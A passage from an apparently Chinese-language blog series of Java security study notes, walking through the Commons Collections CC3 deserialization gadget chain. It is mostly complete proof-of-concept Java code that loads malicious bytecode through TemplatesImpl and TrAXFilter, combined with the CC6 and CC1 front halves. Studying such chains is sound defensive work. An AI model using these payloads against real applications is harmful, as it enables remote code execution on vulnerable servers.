import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// 解决了第一个问题  
public class CC1Step1 {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
                new InvokerTransformer("newTransformer",null,null)  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value","cc");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        aihConstructor.setAccessible(true);  
        Object o = aihConstructor.newInstance(Target.class, transformedMap);  
  
        // 序列化反序列化  
        serialize(o);  
        unserialize("ser.bin");  
    }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
    }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
 cc6改造
 ```java
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.crypto.dsig.Transform;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class cc2 {  
    public static void main(String[] args) throws Exception {  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
//        Runtime runtime = Runtime.getRuntime();  
//        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
                new InvokerTransformer("newTransformer",null,null)  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer("This is fake!!!")});  
  
  
        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"niao");  
//        tiedMapEntry.getValue();  
        HashMap<Object, Object> cc2hashmap = new HashMap<>();  
        cc2hashmap.put(tiedMapEntry,"thankyou");  
        objectObjectHashMap.remove("niao");  
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");  
        iTransformers.setAccessible(true);  
        iTransformers.set(chainedTransformer,transformers);  
  
        // 序列化  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
        oos.writeObject(cc2hashmap);  
        oos.close();  
  
        // 反序列化（触发）  
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));  
        ois.readObject();  
  
    }  
}
 ```

## TrAXFilter 与 InstantiateTransformer

 接下来回到cc3链
 接着往前找
 ```java
 public class TrAXFilter extends XMLFilterImpl {  
    private Templates              _templates;  
    private TransformerImpl        _transformer;  
    private TransformerHandlerImpl _transformerHandler;  
    private boolean _useServicesMechanism = true;  
  
    public TrAXFilter(Templates templates)  throws  
        TransformerConfigurationException  
    {  
        _templates = templates;  
        _transformer = (TransformerImpl) templates.newTransformer();  
        _transformerHandler = new TransformerHandlerImpl(_transformer);  
        _useServicesMechanism = _transformer.useServicesMechnism();  
    }
 ```
 我们选择这个因为只要执行构造方法就可以触发了
 cc3解决的问题是invoketransformer被禁用的情况，所以接着往下找，作者采用了InstantiateTransformer的transform方法，我们也用这个构造exp
 InstantiateTransformer的transform方法实现了输入一个Class然后调用这个类的构造方法去实例化一个类
 这里还是稍微有点难理解的，TrAXFilter要输入一个template作为参数，然后他在调用构造方法进行实例化的时候会触发我们想要的那个方法，
 然后我们用InstantiateTransformer的方法来执行，首先实例化输入的是 TrAXFilter的参数类型和参数，transform方法输入的是Class对象，它进行构造的时候让链条运行起来
 ```java
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import javax.xml.transform.TransformerFactory;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
//        templates.newTransformer();  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
        instantiateTransformer.transform(TrAXFilter.class);
 ```

## 使用 CC6 前半链补全

接下来找谁调用了transform就可以了，这都是现成的，我用cc6的前半部分补全链条
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import javax.xml.transform.TransformerFactory;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
//        templates.newTransformer();  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
//        instantiateTransformer.transform(TrAXFilter.class);  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer("This is fake!!!")});  
  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"niao");  
//        tiedMapEntry.getValue();  
        HashMap<Object, Object> cc2hashmap = new HashMap<>();  
        cc2hashmap.put(tiedMapEntry,"thankyou");  
        objectObjectHashMap.remove("niao");  
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");  
        iTransformers.setAccessible(true);  
        iTransformers.set(chainedTransformer,transformers);  
  
        // 序列化  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
        oos.writeObject(cc2hashmap);  
        oos.close();  
  
        // 反序列化（触发）  
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));  
        ois.readObject();  
  
  
    }  
}
```
成功弹出计算器我们三天的努力学习没有白费，cc3也成功跑通了

## 使用 CC1 前半链补全

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class  CC1Step1{  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates, "nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates, new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl());  
  
        InstantiateTransformer instantiateTransformer =  
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
  
        ChainedTransformer chainedTransformer =  
                new ChainedTransformer(new Transformer[]{new ConstantTransformer("This is fake!!!")});  
  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "niao");  
  
        HashMap<Object, Object> cc3hashmap = new HashMap<>();  
        cc3hashmap.put(tiedMapEntry, "thankyou");  
        objectObjectHashMap.remove("niao");  
  
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");  
        iTransformers.setAccessible(true);  
        iTransformers.set(chainedTransformer, transformers);  
  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
        oos.writeObject(cc3hashmap);  
        oos.close();  
  
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));  
        ois.readObject();  
        ois.close();  
    }  
}
```

## 调用链回顾与学习总结

这是用cc1补全形成的链条
cc3学习结束了，反序列化真难啊
还是要复习一下这条链新发现的额前半部分，首先是通过TemplatesImpl.java来加载恶意的class，我们发现他重写了defineclass，然后找到defineTransletClasses调用了它，getTransletInstance又调用了defineTransletClasses，然后在这个方法里面还进行了实例化，接着找newTransformer调用了这个方法，这个是公共的可以被调用了，这个基本加载恶意字节码的调用完成了，为了凑成完整的链条，接着往前找，找到了TrAXFilter.java，这个类的构造函数里直接调用了，由于cc3不使用invoketransformer，所以引进了一个新的来 InstantiateTransformer来实例化它从而触发，其他的前面的部分可以沿用cc1和cc6.

至此真正的结束了，耗时三天完成，希望下面的内容可以简单一点

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/)
